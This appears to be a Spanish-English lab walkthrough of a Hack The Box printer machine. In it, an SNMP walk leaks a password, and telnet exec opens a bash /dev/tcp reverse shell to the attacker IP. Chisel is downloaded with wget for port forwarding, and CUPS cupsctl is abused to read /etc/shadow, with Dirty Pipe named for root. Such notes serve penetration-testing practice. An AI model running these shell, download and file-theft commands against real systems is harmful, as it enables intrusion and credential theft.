<font color="green">=======================================================================</font>
# Initial Information<font color="red">:</font> 
<font color="blue">=======================================================================</font>

Name | IP Address | Tech Stack | Web Server | DB
-- | -- | -- | -- | --
-- | -- | -- | -- | --


<hr>

### Loot - Credentials<font color="red">:</font> 

| **User** | **Password**                          | **System** |
| -------- | ------------------------------------- | ---------- |
|          | P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i |            |

<hr>

<font color="green">=======================================================================</font>
# Enumeration
<font color="green">=======================================================================</font>

##### <font color="red">[+]</font> SERVICES<font color="red">:</font> 
- HTTP - <font color="red">XX</font> 

##### <font color="red">[+]</font> NMAP<font color="red">:</font> 

List all ports.
```bash
PORT   STATE SERVIC
23/tcp open  telnet
telnet $ip
Trying 10.10.11.107...
Connected to 10.10.11.107.
PORT   STATE SERVICE
```

Services and version on identified open ports.
```bash 
PORT    STATE SERVICE
161/udp open  snmp
HP JetDirect

se busca la contrasena de ese servicio en internet o aparato
```


<hr>

<font color="green">=======================================================================</font>
# Post Exploitation
<font color="green">=======================================================================</font>

##### <font color="red">[+]</font> PrivEsc Notes<font color="red">:</font> 
snmpwalk

```
snmpwalk -c public -v2c $ip
iso.3.6.1.2.1 = STRING: "HTB Printer"
snmpwalk -c public -v2c $ip 1
iso.3.6.1.2.1 = STRING: "HTB Printer"
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
iso.3.6.1.4.1.11.2.3.9.1.2.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

de ahi se extrae los BITS y se usa xxd -ps -r
```
echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | xargs | xxd -ps -r

P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i	IYaA"1&1A5%  
```

```
telnet $ip
Password:
```
just type ? to get menu:
```
Please type "?" for HELP
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)

exec: execute system commands (exec id)

```

open a nc.  ```nc -nlvp 443```

get the shell
````exec bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1" ```

Get a interactiv shell now:
```
script /dev/null -c bash
Script started, file is /dev/null
This account is currently not available.
```

Eso no funciono, entonces usar python
```python3 -c 'import pty;pty.spawn("/bin/bash")' ```

Control Z para poner en background y luego:
``` Control z```

```stty raw -echo; fg```
```reset xterm```

checa la termina size en otra ventana: 
stty size
64 144

y regresar a la terminal para configurar el tamano de la tty
``` 
export TERM=xterm
stty rows 64 cols 144
```



##### <font color="red">[+]</font> Dirtypipe - Root<font color="red">:</font> 
```which gcc```

si tenemos podemos usar dirtypipe, con el script privado, las instrucciones completas estan al ejecutar el script:
```
privado

echo "en la otra maquina:"
gcc privado.c -o privado
./privado
```


##### <font color="red">[+]</font> searchsploit cups - Root<font color="red">:</font> 

```searchsploit cups```
we check this file for exec and look how it works:
https://github.com/rapid7/metasploit-framework/blob/master/modules/post/multi/escalate/cups_root_file_read.rb

```
Line 116
# first we set the error log to the path intended
    cmd_exec("#{ctl_path} ErrorLog=#{datastore['FILE']}")
    cmd_exec("#{ctl_path} WebInterface=yes")
    @error_log_was_reset = true

    # now we go grab it from the ErrorLog route
    file = strip_http_headers(get_request('/admin/log/error_log'))
```

```
Line 48
register_options([
      OptString.new('FILE', [true, 'The file to steal.', '/etc/shadow']),
      OptString.new('ERROR_LOG',
                    [true, 'The original path to the CUPS error log', '/var/log/cups/error_log'])
    ])
```

Usando esos datos conclimos que podemos sacar datos desde la misma maquina haciendo peticiones:
primero se manda el archivo que se quiere:
```cupsctl ErrorLog=/etc/passwd```

Luego se jala el archivo en la misma maquina hackeada:
``` curl -s -X GET localhost:631/admin/log/error_log```

Entonces se puede tener una bash como root desde ahi:
```
	Aun no la encuentro
```

Otro recurso puede ser usar esto
https://github.com/p1ckzi/CVE-2012-5519/blob/main/cups-root-file-read.sh
ejecutarlo en la maquina , creo automatiza lo que hice arriba.
```
searchsploit -m 41233
```
eso trae el script a mi directorio
```

```



##### <font color="red">[+]</font> System Enumeration<font color="red">:</font> 

- **Host**:
- **Compilation version and architecture**:


##### <font color="red">[+]</font> chisel<font color="red">:</font> 
``
En mi maquina
```
script: servidor
luego:
chisel server --reverse -p 1234 
```
En la otra para habilitar el puerto 631 donde hay una pagina corriendo cups:
```
wget 10.10.14.3:8880/chisel
chmod +x chisel
./chisel client 10.10.14.3:1234 R:631:127.0.0.1:631
```






##### <font color="red">[+]</font> S/GUIDS<font color="red">:</font> 

- SUIDs:
```bash
find / -perm -u=s -type f 2>/dev/null
```

##### <font color="red">[+]</font> ROOT Processes (ps) <font color="red">:</font> 
```bash
ps aux | grep -i root --color
```

##### <font color="red">[+]</font> Local Network Services (netstat/ss)<font color="red">:</font> 
```bash
# (or ss if netstat not available)
netstat -tunlp | grep '127.0.0.1' --color=auto
netstat -antup | grep '127.0.0.1' --color=auto
```

##### <font color="red">[+]</font> netstat -tulpn<font color="red">:</font> 
```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      1042/python3        
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -         

```

```curl localhost:631```

```
<HTML>
<HEAD>
	<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
	<TITLE>Home - CUPS 1.6.1</TITLE>
```
